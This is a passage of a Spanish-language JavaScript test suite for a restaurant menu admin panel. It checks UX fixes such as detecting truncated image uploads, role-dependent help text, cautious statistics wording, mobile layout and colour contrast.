				apiFetch: async (metodo) => (metodo === 'POST' ? { id: 'c-nueva', nombre: 'Entradas', orden: 0 } : { nombre: 'Entradas' }),
				renderCatList() {}, renderCatFilter() {}, renderProducts() {}, closeModal() {}, showToast() {},
				openNewProductModal() { abiertos.push('producto'); },
			});
		if (seguir) vm.runInContext('seguirConPlato = true;', ctx);
		return { ctx, $, abiertos };
	}

	test('crear la primera categoría desde «+ Nuevo producto» abre el plato con ella elegida', async () => {
		const { ctx, $, abiertos } = montarGuardado({ seguir: true });
		await ctx.saveCat();
		assert.deepEqual(abiertos, ['producto'], 'no se volvió a la ficha del plato');
		assert.equal($('editCategoria').value, 'c-nueva', 'la categoría recién creada no quedó elegida');
		assert.equal(vm.runInContext('seguirConPlato', ctx), false, 'la bandera no se consumió');
	});

	test('crear una categoría por el camino normal no abre ningún plato', async () => {
		const { ctx, abiertos } = montarGuardado({ seguir: false });
		await ctx.saveCat();
		assert.deepEqual(abiertos, []);
	});

	test('editar una categoría nunca encadena el plato, aunque la bandera esté puesta', async () => {
		const { ctx, abiertos } = montarGuardado({ id: 'c1', seguir: true });
		await ctx.saveCat();
		assert.deepEqual(abiertos, []);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los dos desplegables de orden no se confunden', () => {
	// P1 en docs/revision-ux.md. A 29 px uno del otro, uno ordenaba la lista del
	// panel y el otro publicaba el orden de la carta; las etiquetas se
	// diferenciaban en la palabra «de».
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('cada opción del de la lista dice que es solo para ver aquí', () => {
		const sel = src.match(/<select[^>]*id="sortSelect"[\s\S]*?<\/select>/)[0];
		const opciones = [...sel.matchAll(/<option[^>]*>([^<]*)</g)].map(m => m[1]);
		assert.ok(opciones.length >= 5);
		for (const o of opciones) assert.match(o, /^Ver aquí:/, `«${o}» no dice que es solo una vista`);
	});

	test('el de la carta avisa de que publica', () => {
		const tarjeta = src.match(/id="ordenProductos"[\s\S]*?id="ordenProductosAyuda"/)[0];
		assert.match(tarjeta, /aria-describedby="ordenProductosAviso"/);
		assert.match(tarjeta, /id="ordenProductosAviso"[^>]*>\s*Así ven tus clientes/);
		assert.match(src, /Orden en tu carta/);
	});

	function montar({ guardado = 'precio_asc', elegido = 'nombre_az', falla = false } = {}) {
		const campos = {};
		const $ = k => (campos[k] ||= { value: '', textContent: '', style: {} });
		$('ordenProductos').value = elegido;
		const llamadas = [], avisos = [];
		const state = { restaurante: { id: 'r1', atributos: { orden_productos: guardado } }, productos: [], categorias: [], catFiltro: 'all' };
		const ctx = cargar('index.html', 'function ordenProductosModo', '// Reasigna 0,1,2', {
			document: { getElementById: $ }, state, setTimeout() {},
			apiFetch: async (metodo, url, body) => {
				llamadas.push(body);
				if (falla) throw new Error('sin red');
				return { id: 'r1', atributos: { orden_productos: body.atributos.orden_productos } };
			},
			renderProducts() {}, enTandas: async () => {},
			showToast: (msg, tipo, accion) => avisos.push({ msg, tipo, accion }),
		});
		return { ctx, $, llamadas, avisos, state };
	}

	test('al publicar un orden se dice, con Deshacer, y Deshacer vuelve al anterior', async () => {
		const { ctx, $, llamadas, avisos } = montar();
		await ctx.guardarOrdenProductos();
		assert.equal(avisos.length, 1);
		assert.match(avisos[0].msg, /clientes/);
		assert.ok(avisos[0].accion, 'el aviso no ofrece deshacer');
		avisos[0].accion.alPulsar();
		await new Promise(r => setImmediate(r));
		assert.deepEqual(llamadas.map(b => b.atributos.orden_productos), ['nombre_az', 'precio_asc']);
		assert.equal($('ordenProductos').value, 'precio_asc');
		assert.equal(avisos[1].accion, undefined, 'deshacer no debe ofrecer otro deshacer');
	});

	test('si no se guarda, el desplegable vuelve a lo que de verdad está publicado', async () => {
		const { ctx, $ } = montar({ falla: true });
		await ctx.guardarOrdenProductos();
		assert.equal($('ordenProductos').value, 'precio_asc');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('una foto cortada no se sube ni se anuncia en verde', () => {
	// SU2 en docs/revision-ux.md. Probado el 10/09/2026 con un JPEG cortado al
	// 10 %: el navegador lo decodificaba a medias y el panel decía «✓ Lista para
	// guardar» encima de una foto blanca en sus nueve décimas partes.
	const { imagenIncompleta } = cargar('index.html', 'function imagenIncompleta', 'const MENSAJE_IMAGEN_INCOMPLETA', {});
	const u8 = (...partes) => Uint8Array.from(partes.flat());
	const seg = (marca, datos) => [0xFF, marca, ((datos.length + 2) >> 8) & 0xFF, (datos.length + 2) & 0xFF, ...datos];

	// Un JPEG con la forma de uno de verdad: APP0, datos con FF 00 de relleno
	// dentro de la imagen, y su FF D9 al final.
	const SOI = [0xFF, 0xD8], EOI = [0xFF, 0xD9];
	const escaneo = [0x12, 0xFF, 0x00, 0x34, 0x56, 0xFF, 0xD0, 0x78];   // FF00 relleno, FFD0 un RST
	const jpeg = (...cola) => u8(SOI, seg(0xE0, [0x4A, 0x46, 0x49, 0x46, 0]), seg(0xDA, [1, 2, 3]), escaneo, ...cola);

	test('un JPEG entero pasa', () => {
		assert.equal(imagenIncompleta(jpeg(EOI)), false);
	});

	test('un JPEG cortado dentro de la imagen se detecta', () => {
		assert.equal(imagenIncompleta(jpeg()), true);
	});

	test('un JPEG cortado antes de empezar la imagen se detecta', () => {
		assert.equal(imagenIncompleta(u8(SOI, seg(0xE0, [1, 2, 3]))), true);
	});

	test('la miniatura EXIF, con su propio fin, no hace pasar por entera una foto cortada', () => {
		// La trampa de buscar FF D9 a lo bruto: la miniatura lo trae dentro de APP1.
		const miniatura = [0x45, 0x78, 0x69, 0x66, 0, 0, ...SOI, 0xFF, 0xDA, 0, 3, 9, 9, ...EOI];
		const cortada = u8(SOI, seg(0xE1, miniatura), seg(0xDA, [1, 2, 3]), escaneo);
		assert.equal(imagenIncompleta(cortada), true);
		assert.equal(imagenIncompleta(u8(cortada, EOI)), false);
	});

	test('una foto en movimiento de Android, con un video pegado detrás, pasa', () => {
		// Esas fotos llevan un MP4 después del FF D9. Mirar solo los últimos bytes
		// las rechazaría todas.
		const video = [0, 0, 0, 0x18, 0x66, 0x74, 0x79, 0x70, 0x6D, 0x70, 0x34, 0x32, ...new Array(64).fill(7)];
		assert.equal(imagenIncompleta(jpeg(EOI, video)), false);
	});

	const PNG_FIRMA = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
	const IEND = [0, 0, 0, 0, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82];
	test('un PNG con IEND pasa; sin él, se detecta', () => {
		assert.equal(imagenIncompleta(u8(PNG_FIRMA, new Array(40).fill(1), IEND)), false);
		assert.equal(imagenIncompleta(u8(PNG_FIRMA, new Array(40).fill(1))), true);
	});

	const webp = (declarado, real) => {
		const b = new Uint8Array(real);
		b.set([0x52, 0x49, 0x46, 0x46, declarado & 0xFF, (declarado >> 8) & 0xFF, 0, 0, 0x57, 0x45, 0x42, 0x50]);
		return b;
	};
	test('un WebP que mide lo que declara pasa; uno más corto, se detecta', () => {
		assert.equal(imagenIncompleta(webp(92, 100)), false);
		assert.equal(imagenIncompleta(webp(492, 100)), true);
	});

	test('lo que no reconoce no lo juzga', () => {
		// Un GIF, un archivo raro: aquí no se valida, se avisa del caso conocido.
		assert.equal(imagenIncompleta(u8([0x47, 0x49, 0x46, 0x38, 0x39, 0x61])), false);
		assert.equal(imagenIncompleta(u8([])), false);
	});

	test('compressImage la rechaza antes de decodificar, con un mensaje que dice qué hacer', async () => {
		let decodificada = false;
		const ctx = cargar('index.html', [['let _haceWebp', 'async function uploadImg']], {
			// Si llegara a leerse, falla en el acto: una promesa colgada deja la
			// prueba cancelada, no fallida, y la regresión pasaría sin ruido.
			FileReader: class { readAsDataURL() { decodificada = true; setTimeout(() => this.onerror?.(), 0); } },
			Image: class {}, document: { createElement: () => ({}) },
		});
		const archivo = { name: 'plato.jpg', type: 'image/jpeg', arrayBuffer: async () => jpeg().buffer };
		await assert.rejects(ctx.compressImage(archivo, 800, .82), err => {
			assert.match(err.message, /incompleta/);
			assert.match(err.message, /descargarla|elige otra/);
			return true;
		});
		assert.equal(decodificada, false, 'se intentó abrir la foto rota en vez de rechazarla antes');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los avisos no mandan al cliente a pestañas que no ve', () => {
	// CL1 en docs/revision-ux.md. «Súbelo en la pestaña Apariencia» y «Actívalos en
	// Apariencia» se le enseñaban al restaurante, que no tiene esa pestaña.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	function montar() {
		const nodos = {};
		const nodo = () => ({
			_t: '', hijos: [], style: {},
			// textContent borra los hijos, como en un navegador
			set textContent(v) { this._t = v; this.hijos = []; }, get textContent() { return this._t; },
			appendChild(h) { this.hijos.push(h); return h; },
		});
		const ctx = cargar('index.html', '// ── AYUDA QUE DEPENDE DE QUIÉN MIRA', '// Mismo criterio que la carta (soloDigitos)', {
			Object, encodeURIComponent,
			document: {
				getElementById: id => (nodos[id] ||= nodo()),
				createElement: () => nodo(),
			},
		});
		return { ctx, nodos };
	}

	test('al cliente no se le nombra Apariencia, y se le da el WhatsApp', () => {
		const { ctx, nodos } = montar();
		ctx.pintarAyudaSegunQuienMira(false);
		for (const id of ['qrSinLogo', 'editFiltrosVacio']) {
			assert.doesNotMatch(nodos[id].textContent, /Apariencia/, `${id} manda al cliente a Apariencia`);
			const enlace = nodos[id].hijos[0];
			assert.ok(enlace, `${id} no ofrece a quién pedirlo`);
			assert.match(enlace.href, /^https:\/\/wa\.me\/573151182283\?text=/);
			assert.equal(enlace.rel, 'noopener');
		}
	});

	test('al superadmin sí se le dice dónde está, sin enlace', () => {
		const { ctx, nodos } = montar();
		ctx.pintarAyudaSegunQuienMira(false);   // aunque antes se pintara para un cliente
		ctx.pintarAyudaSegunQuienMira(true);
		assert.match(nodos.qrSinLogo.textContent, /pestaña Apariencia/);
		assert.match(nodos.editFiltrosVacio.textContent, /Apariencia → Filtros/);
		assert.equal(nodos.qrSinLogo.hijos.length, 0);
	});

	test('se pinta donde se decide si se ve Apariencia', () => {
		const i = src.indexOf("document.getElementById('tabBtnApariencia').style.display = state.rol === 'admin'");
		assert.ok(i > 0);
		assert.match(src.slice(i, i + 250), /pintarAyudaSegunQuienMira\(state\.rol === 'admin'\)/);
	});

	test('la personalización usa la misma regla que la pestaña Toppings', () => {
		// «Créalos en la pestaña Toppings» solo es verdad si la pestaña está. Con
		// reglas distintas, desde PE3 un Topnav con el interruptor puesto veía el
		// aviso con la pestaña escondida.
		const pers = src.match(/function renderPersonalizacion\(\) \{[\s\S]*?\n\}/)[0];
		const pestanas = src.match(/function ajustarPestanasAlModelo\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(pers, /cartaTieneCarrito\(/);
		assert.match(pestanas, /cartaTieneCarrito\(/);
		assert.doesNotMatch(pers, /attr\.nav === 'carrito'/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('con «Activa» apagada, los destinos de la promoción se ven sin efecto', () => {
	// B2 en docs/revision-ux.md. Los tres interruptores eran iguales, y apagando
	// «Activa» seguían «En la carta» y «En el televisor» encendidos a la vista.
	const src = codigoDelPanel();
	const { atenuarDestinos } = cargar('promocion.js', 'function atenuarDestinos', 'function programacionDelFormulario', {});

	function caja(activa) {
		const destinos = [{ style: {}, title: '' }, { style: {}, title: '' }];
		return {
			destinos,
			querySelector: sel => (sel === '.p-activa' ? { checked: activa } : null),
			querySelectorAll: sel => (sel === '.p-destino' ? destinos : []),
		};
	}

	test('apagada: los dos destinos atenuados y con el motivo', () => {
		const c = caja(false);
		atenuarDestinos(c);
		for (const d of c.destinos) {
			assert.equal(d.style.opacity, '0.4');
			assert.match(d.title, /apagada/);
		}
	});

	test('encendida: vuelven a verse normales', () => {
		const c = caja(false);
		atenuarDestinos(c);
		c.querySelector = sel => (sel === '.p-activa' ? { checked: true } : null);
		atenuarDestinos(c);
		for (const d of c.destinos) {
			assert.equal(d.style.opacity, '');
			assert.equal(d.title, '');
		}
	});

	test('los dos destinos llevan la marca, y «Activa» no', () => {
		const t = src.match(/function tarjetaDePromo\(p\) \{[\s\S]*?\n\}/)[0];
		assert.match(t, /class="p-destino form-check"><label class="toggle"><input type="checkbox" class="p-popup">/);
		assert.match(t, /class="p-destino p-tv-fila form-check"><label class="toggle"><input type="checkbox" class="p-tv">/);
		assert.doesNotMatch(t, /p-destino[^>]*><label class="toggle"><input type="checkbox" class="p-activa">/);
	});

	test('se repinta cada vez que cambia algo de la tarjeta', () => {
		// nota() se llama al pintar y en cada onchange de los interruptores.
		const t = src.match(/function tarjetaDePromo\(p\) \{[\s\S]*?\n\}/)[0];
		assert.match(t, /const nota = \(\) => \{\s*atenuarDestinos\(caja\);/);
		assert.match(t, /for \(const c of \['p-activa', 'p-popup', 'p-tv'/);
	});

	test('atenuar no los deshabilita: se pueden dejar preparados antes de encender', () => {
		const cuerpo = src.match(/function atenuarDestinos\(caja\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(cuerpo, /disabled/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('las estadísticas no concluyen más de lo que los datos permiten', () => {
	// E1, E2, E3, M6 y B3 en docs/revision-ux.md: «Tasa de interacción: 125 %»,
	// porcentajes redondos sobre cinco eventos, y «Platos que nadie abrió» con
	// cero visitas o con 27 visitas sobre 97 platos.
	const nodo = () => ({
		style: {}, textContent: '', innerHTML: '', className: '', hijos: [],
		appendChild(h) { this.hijos.push(h); return h; },
	});
	function montar(productos = [], categorias = []) {
		const nodos = {};
		const ctx = cargar('estadisticas.js', [
			['// ── MÁS AGREGADOS AL CARRITO', '// ── HORAS DE MAYOR TRÁFICO'],
			['// ── PLATOS QUE NADIE ABRIÓ', 'function renderKpis'],
		], {
			Object, String, Math,
			state: { productos, categorias },
			esc: s => String(s),
			document: { getElementById: id => (nodos[id] ||= nodo()), createElement: () => nodo() },
		});
		return { ctx, nodos };
	}
	const texto = n => n.textContent + n.innerHTML + n.hijos.map(h => h.textContent).join('');

	// ── E1 ──────────────────────────────────────────────────────
	test('clics por visita en vez de un porcentaje que pasa de 100', () => {
		const { ctx } = montar();
		assert.equal(ctx.clicsPorVisita(5, 4), '1,3');
		assert.equal(ctx.clicsPorVisita(19, 27), '0,7');
		assert.doesNotMatch(ctx.clicsPorVisita(5, 4), /%/);
	});

	test('sin visitas no se inventa un 0 rotundo', () => {
		assert.equal(montar().ctx.clicsPorVisita(0, 0), '—');
	});

	test('el indicador ya no se llama tasa ni lleva %', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'estadisticas.js'), 'utf8');
		const kpis = src.match(/function renderKpis\(data\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(kpis, /tasaInteraccion|Tasa de interacción/);
		assert.match(kpis, /Clics por visita/);
	});

	// ── E2 ──────────────────────────────────────────────────────
	const datosCarrito = (totalClics, clicsPlato) => ({
		totalAgregados: 5, totalClics, tasaAnadido: 100,
		masAgregados: [{ nombre: 'SUPREMA', agregados: 5, clics: clicsPlato }],
	});

	test('con pocas fichas abiertas se da el número y se calla el porcentaje', () => {
		const { ctx, nodos } = montar();
		ctx.renderCarrito(datosCarrito(5, 5));
		assert.equal(nodos.estCarritoResumen.textContent, '5 en total');
		// «% de» y no «%» a secas: la barra lleva width:100% en su estilo.
		assert.doesNotMatch(nodos.estCarrito.innerHTML, /\d+% de/, 'la fila del plato sigue dando «100 % de 5»');
	});

	test('con muestra suficiente, el porcentaje vuelve', () => {
		const { ctx, nodos } = montar();
		ctx.renderCarrito(datosCarrito(40, 25));
		assert.match(nodos.estCarritoResumen.textContent, /100% de las fichas abiertas/);
		assert.match(nodos.estCarrito.innerHTML, /20% de 25/);
	});

	// ── E3 ──────────────────────────────────────────────────────
	test('con pocas visitas se avisa de cuánto pesan los números', () => {
		const { ctx, nodos } = montar();
		ctx.avisoPocosDatos(4);
		assert.equal(nodos.estPocosDatos.style.display, 'block');
		assert.match(nodos.estPocosDatos.textContent, /4 visitas/);
		ctx.avisoPocosDatos(0);
		assert.match(nodos.estPocosDatos.textContent, /todavía no tiene visitas/);
		ctx.avisoPocosDatos(30);
		assert.equal(nodos.estPocosDatos.style.display, 'none');
	});

	// ── M6 y B3 ─────────────────────────────────────────────────
	const plato = (disponible = true) => ({ disponible });
	const ignorados = [{ categoria: 'ENTRADAS', nombre: 'Papas a la francesa' }];

	test('con cero visitas no acusa a la carta', () => {
		// M6: zz-pruebas-ux, recién creado, con su único plato «ignorado».
		const { ctx, nodos } = montar([plato()]);
		ctx.renderIgnorados(ignorados, 0, 1);
		assert.doesNotMatch(texto(nodos.estIgnorados), /Papas/);
		assert.match(texto(nodos.estIgnorados), /Sin visitas/);
		assert.equal(nodos.estIgnoradosResumen.textContent, '');
	});

	test('con menos visitas que platos, lo dice en vez de listar', () => {
		// B3: Bonzas, 27 visitas y 97 platos, «86 en total».
		const { ctx, nodos } = montar();
		ctx.renderIgnorados(ignorados, 27, 97);
		assert.doesNotMatch(texto(nodos.estIgnorados), /Papas/);
		assert.match(texto(nodos.estIgnorados), /al menos 97 en el rango y hay 27/);
	});

	test('una carta pequeña necesita igualmente un mínimo de visitas', () => {
		const { ctx } = montar();
		assert.equal(ctx.visitasParaIgnorados(3), 30);
		assert.equal(ctx.visitasParaIgnorados(97), 97);
	});

	test('con visitas suficientes, la lista sale como siempre', () => {
		const { ctx, nodos } = montar();
		ctx.renderIgnorados(ignorados, 257, 97);
		assert.match(nodos.estIgnorados.innerHTML, /Papas a la francesa/);
		assert.equal(nodos.estIgnoradosResumen.textContent, '1 en total');
	});

	test('los platos que cuentan son los disponibles', () => {
		const { ctx } = montar([plato(), plato(), plato(false)]);
		assert.equal(ctx.platosDisponibles(), 2);
	});

	// ── B3, la segunda mitad ──────────────────────────────────
	test('las categorías que se piden sin abrir la ficha no se listan, y se dice', () => {
		const { ctx, nodos } = montar();
		const lista = [
			{ categoria: 'ENTRADAS', nombre: 'Papas a la francesa' },
			{ categoria: 'CERVEZAS', nombre: 'Águila' }, { categoria: 'CERVEZAS', nombre: 'Corona' },
		];
		ctx.renderIgnorados(lista, 257, 97, ['CERVEZAS']);
		assert.doesNotMatch(nodos.estIgnorados.innerHTML, /Águila|Corona/);
		assert.match(nodos.estIgnorados.innerHTML, /Papas a la francesa/);
		assert.equal(nodos.estIgnoradosResumen.textContent, '1 en total · sin contar «CERVEZAS»');
		ctx.renderIgnorados(lista, 257, 97, ['CERVEZAS', 'BEBIDAS']);
		assert.match(nodos.estIgnoradosResumen.textContent, /sin contar 2 categorías que se piden sin abrir/);
	});

	test('si solo quedaban esas, la carta sale limpia', () => {
		const { ctx, nodos } = montar();
		ctx.renderIgnorados([{ categoria: 'CERVEZAS', nombre: 'Águila' }], 257, 97, ['CERVEZAS']);
		assert.match(nodos.estIgnorados.innerHTML, /Todos los platos disponibles se abrieron/);
	});

	test('sus platos no cuentan para las visitas que hacen falta', () => {
		const cats = [{ id: 'c1', nombre: 'HAMBURGUESAS', atributos: {} }, { id: 'c2', nombre: 'CERVEZAS', atributos: { se_pide_sin_abrir: true } }];
		const prods = [
			{ categoria_id: 'c1' }, { categoria_id: 'c1', disponible: false },
			{ categoria_id: 'c2' }, { categoria_id: 'c2' }, { categoria_id: 'c2' },
		];
		const { ctx } = montar(prods, cats);
		assert.equal(ctx.platosQueSeAbren(), 1);
		assert.equal(ctx.platosDisponibles(), 4, 'el total de la carta no cambia');
		assert.deepEqual([...ctx.categoriasSinAbrir()], ['CERVEZAS']);
	});

	test('cargarEstadisticas pasa las visitas y los platos a la sección', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'estadisticas.js'), 'utf8');
		assert.match(src, /renderIgnorados\(data\.nuncaAbiertos \|\| \[\], data\.totalVisitas, platosQueSeAbren\(\), categoriasSinAbrir\(\)\)/);
		assert.match(src, /avisoPocosDatos\(data\.totalVisitas\);/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('las pestañas avisan de que hay más fuera de la pantalla', () => {
	// M1 en docs/revision-ux.md. A 375 px, 519 px de pestañas y la barra escondida
	// a mano: la última quedaba 124 px fuera sin nada que lo dijera.
	const src = codigoDelPanel();
	const { bordesConContenido } = cargar('index.html', 'function bordesConContenido', 'function marcarBordesDeTabs', {});

	test('al principio de un carril más ancho que la pantalla, queda contenido a la derecha', () => {
		const b = bordesConContenido({ scrollLeft: 0, clientWidth: 375, scrollWidth: 519 });
		assert.equal(b.derecha, true);
		assert.equal(b.izquierda, false);
	});

	test('a mitad, por los dos lados; al final, solo a la izquierda', () => {
		assert.deepEqual({ ...bordesConContenido({ scrollLeft: 60, clientWidth: 375, scrollWidth: 519 }) }, { izquierda: true, derecha: true });
		assert.deepEqual({ ...bordesConContenido({ scrollLeft: 144, clientWidth: 375, scrollWidth: 519 }) }, { izquierda: true, derecha: false });
	});

	test('si caben todas, no se difumina nada', () => {
		assert.deepEqual({ ...bordesConContenido({ scrollLeft: 0, clientWidth: 1000, scrollWidth: 1000 }) }, { izquierda: false, derecha: false });
	});

	test('el medio píxel del zoom no cuenta como contenido', () => {
		assert.equal(bordesConContenido({ scrollLeft: 143.6, clientWidth: 375, scrollWidth: 519 }).derecha, false);
	});

	test('la barra ya no está escondida', () => {
		const regla = src.match(/\.tabs\{[^}]*\}/)[0];
		assert.doesNotMatch(regla, /scrollbar-width:none/);
		assert.doesNotMatch(src, /\.tabs::-webkit-scrollbar\{display:none;?\}/);
	});

	test('la pestaña pulsada se trae a la vista', () => {
		const cuerpo = src.match(/function switchTab\(tab, btn\) \{[\s\S]*?\n\}/)[0];
		assert.match(cuerpo, /btn\.scrollIntoView\?\.\(\{ block: 'nearest', inline: 'nearest'/);
	});

	test('se vigila desde el arranque y se repinta al cambiar las pestañas visibles', () => {
		const arranque = src.slice(src.indexOf('// ── ARRANQUE'));
		assert.match(arranque, /vigilarBordesDeTabs\(\);/);
		const ajustar = src.match(/function ajustarPestanasAlModelo\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(ajustar, /marcarBordesDeTabs\(\)/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la fila de categoría cabe en un móvil', () => {
	// M3 en docs/revision-ux.md. A 375 px la fila medía 326 px dentro de una caja de
	// 307, y la única regla móvil que la tocaba ENCOGÍA el botón de borrar.
	const src = codigoDelPanel();
	const bloqueMovil = (() => {
		const i = src.indexOf('@media(max-width:680px){');
		assert.ok(i > 0, 'no se encontró el bloque de móvil');
		// Hasta la llave que lo cierra, contando anidamiento.
		let prof = 0, j = src.indexOf('{', i);
		for (; j < src.length; j++) {
			if (src[j] === '{') prof++;
			else if (src[j] === '}' && --prof === 0) break;
		}
		return src.slice(i, j);
	})();
	const px = (regla, prop) => Number((regla.match(new RegExp(prop + String.raw`\s*:\s*(\d+)px`)) || [])[1] || 0);

	test('la fila se parte en dos en móvil, con los controles abajo', () => {
		assert.match(bloqueMovil, /\.cat-row\{[^}]*flex-wrap:wrap/);
		assert.match(bloqueMovil, /\.cat-acciones\{[^}]*flex-basis:100%[^}]*border-top/);
	});

	test('en móvil el botón de borrar no es más pequeño que en escritorio', () => {
		const base = src.match(/\.btn-del \{[^}]*\}/)[0];
		const movil = bloqueMovil.match(/\.btn-del\s*\{[^}]*\}/)[0];
		assert.ok(px(movil, 'font-size') >= px(base, 'font-size'),
			`borrar pasa de ${px(base, 'font-size')} px a ${px(movil, 'font-size')} px en móvil`);
	});

	test('las flechas y borrar tienen diana de dedo en móvil', () => {
		const regla = bloqueMovil.match(/\.cat-acciones \.btn-edit,\.cat-acciones \.btn-del\{[^}]*\}/);
		assert.ok(regla, 'falta el tamaño mínimo de los controles de la fila');
		assert.ok(px(regla[0], 'min-width') >= 44 && px(regla[0], 'min-height') >= 40);
	});

	test('los tres controles van juntos en su grupo, en el mismo orden', () => {
		const nodo = (tag) => ({
			tag, className: '', textContent: '', style: {}, hijos: [], title: '', type: '', atributos: {},
			dataset: {}, appendChild(h) { this.hijos.push(h); return h; }, addEventListener() {},
			setAttribute(k, v) { this.atributos[k] = String(v); },
		});
		const lista = nodo('div');
		const ctx = cargar('index.html', '// ── LA LÍNEA DE DATOS DE CADA CATEGORÍA', '// Muestra/oculta el campo de imagen', {
			state: {
				categorias: [{ id: 'c1', nombre: 'Hamburguesas', emoji: '🍔' }, { id: 'c2', nombre: 'Bebidas' }],
				productos: [{ categoria_id: 'c1' }],
			},
			document: { getElementById: () => lista, createElement: nodo },
			categoriaVisibleAhora: () => true, describirHorario: () => '',
			moveCat() {}, openEditCatModal() {}, confirmDelete() {},
		});
		ctx.renderCatList();
		const fila = lista.hijos[0];
		assert.equal(fila.hijos.length, 3, 'la fila debería tener emoji, datos y el grupo de controles');
		const acciones = fila.hijos[2];
		assert.equal(acciones.className, 'cat-acciones');
		assert.deepEqual(acciones.hijos.map(h => h.className || h.hijos.map(b => b.textContent).join('')), ['⠿↑↓', 'btn-edit', 'btn-del']);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('en vista clara, el acento sobre su fondo tenue se lee', () => {
	// CL4 en docs/revision-ux.md. El chip SELECCIONADO —el que dice qué filtro está
	// puesto— era lo menos legible de la pantalla: verde #0b8850 sobre su propio
	// fondo al 10 %, 3,55-3,97 según dónde. Se calcula con la paleta del archivo,
	// no con números copiados: si alguien retoca un color, la cuenta cambia sola.
	const src = codigoDelPanel();
	const bloque = sel => src.slice(src.indexOf(sel), src.indexOf('}', src.indexOf(sel)));
	const claro = bloque(':root[data-theme="light"] {');
	const oscuro = bloque(':root {');
	const vari = (b, nombre) => (b.match(new RegExp('--' + nombre + String.raw`:\s*([^;]+);`)) || [])[1]?.trim();
	const hex = h => [1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16));
	const rgba = v => { const m = v.match(/[\d.]+/g).map(Number); return { c: m.slice(0, 3), a: m[3] ?? 1 }; };
	const lum = c => { const l = c.map(v => { v /= 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; }); return 0.2126 * l[0] + 0.7152 * l[1] + 0.0722 * l[2]; };
	const contraste = (a, b) => { const x = lum(a), y = lum(b); return (Math.max(x, y) + 0.05) / (Math.min(x, y) + 0.05); };
	const sobre = (capa, base) => base.map((v, i) => capa.a * capa.c[i] + (1 - capa.a) * v);

	test('el texto de acento pasa AA sobre --accent-dim en los tres fondos claros', () => {
		const texto = hex(vari(claro, 'accent-texto'));
		const tenue = rgba(vari(claro, 'accent-dim'));
		for (const fondo of ['bg', 'panel', 'card']) {
			const c = contraste(texto, sobre(tenue, hex(vari(claro, fondo))));
			assert.ok(c >= 4.5, `sobre --${fondo} da ${c.toFixed(2)}`);
		}
	});

	test('con el acento de marca no pasaba: la prueba mide el problema real', () => {
		// Si esto dejara de fallar con el color viejo, la prueba de arriba no
		// estaría midiendo lo que dice.
		const tenue = rgba(vari(claro, 'accent-dim'));
		const c = contraste(hex(vari(claro, 'accent')), sobre(tenue, hex(vari(claro, 'bg'))));
		assert.ok(c < 4.5, `el acento de marca daba ${c.toFixed(2)}`);
	});

	test('el chip seleccionado, el botón de acento y el aviso usan el texto de acento', () => {
		for (const regla of [/\.cat-chip\.active\{[^}]*\}/, /\.btn-sm\.accent\{[^}]*\}/, /\.toast\.info\{[^}]*\}/, /\.btn-edit:hover\{[^}]*\}/]) {
			assert.match(src.match(regla)[0], /color:var\(--accent-texto\)/, `${regla} sigue con el acento de marca como texto`);
		}
	});

	test('en la vista oscura no cambia nada', () => {
		assert.equal(vari(oscuro, 'accent-texto'), vari(oscuro, 'accent'));
	});
});

describe('el rango libre de fechas va junto', () => {
	// M7. A 375 px los dos campos caían en filas distintas y el guion quedaba
	// huérfano: «03/09/2026 –» arriba y «09/09/2026» debajo.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	test('los dos campos y el guion comparten un grupo que no se parte', () => {
		const grupo = src.match(/<span class="rango-campos" style="([^"]*)">([\s\S]*?)<\/span>\s*<\/div>/);
		assert.ok(grupo, 'falta el grupo de los campos del rango');
		assert.doesNotMatch(grupo[1], /flex-wrap:\s*wrap/);
		assert.match(grupo[2], /id="estDesde"[\s\S]*–[\s\S]*id="estHasta"/);
		// Pueden encoger: si no, a 375 px no caben y el grupo desborda.
		for (const id of ['estDesde', 'estHasta']) {
			assert.match(grupo[2].match(new RegExp('<input[^>]*id="' + id + '"[^>]*>'))[0], /min-width:0/);
		}
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los errores de la ficha del plato se dicen todos y en su sitio', () => {
	// F2 en docs/revision-ux.md. Tres return seguidos, el de la categoría sin
	// llevar el foco, todo en un aviso lejos del campo y de uno en uno.
	const { erroresDeFicha } = cargar('index.html', 'function erroresDeFicha', 'const CAMPOS_FICHA', { String, Number });

	test('con los tres vacíos salen los tres, en el orden de la ficha', () => {
		const e = erroresDeFicha({ categoria: '', nombre: '  ', precio: '' });
		assert.deepEqual([...e.map(x => x.campo)], ['editNombre', 'editCategoria', 'editPrecioNum']);
	});

	test('la categoría también es un error de campo, no solo un aviso', () => {
		const e = erroresDeFicha({ categoria: '', nombre: 'Hamburguesa', precio: '22000' });
		assert.equal(e.length, 1);
		assert.equal(e[0].campo, 'editCategoria');
	});

	test('el cero escrito a mano es un precio; vacío o negativo no', () => {
		assert.equal(erroresDeFicha({ categoria: 'c1', nombre: 'Agua', precio: '0' }).length, 0);
		assert.equal(erroresDeFicha({ categoria: 'c1', nombre: 'Agua', precio: '' }).length, 1);
		assert.equal(erroresDeFicha({ categoria: 'c1', nombre: 'Agua', precio: '-5' }).length, 1);
	});

	function dom() {
		const nodos = {};
		const nodo = id => {
			const n = {
				id, clases: new Set(), atributos: {}, enfocado: 0, despues: null, insertados: [],
